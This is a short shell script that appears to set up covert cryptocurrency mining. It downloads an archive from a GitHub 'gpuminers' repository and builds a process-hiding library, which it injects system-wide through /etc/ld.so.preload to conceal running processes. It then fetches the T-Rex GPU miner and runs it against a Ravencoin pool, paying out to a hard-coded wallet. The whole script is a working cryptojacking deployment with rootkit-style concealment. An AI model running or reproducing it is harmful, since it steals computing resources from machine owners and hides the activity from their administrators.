#!/bin/sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicTr.zip
unzip magicTr.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

export PATH=/usr/local/cuda/bin/:$PATH
export LD_LIBRARY_PATH=/usr/local/cuda/lib64/:$LD_LIBRARY_PATH
export LIBRARY_PATH=/usr/local/cuda/lib64:$LIBRARY_PATH

wget https://github.com/trexminer/T-Rex/releases/download/0.19.0/t-rex-0.19.0-linux-cuda11.1.tar.gz
tar -xvzf t-rex-0.19.0-linux-cuda11.1.tar.gz
./t-rex -a kawpow -o stratum+ssl://stratum.ravenminer.com:13838 -u RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj.Rex -p x --mt 3
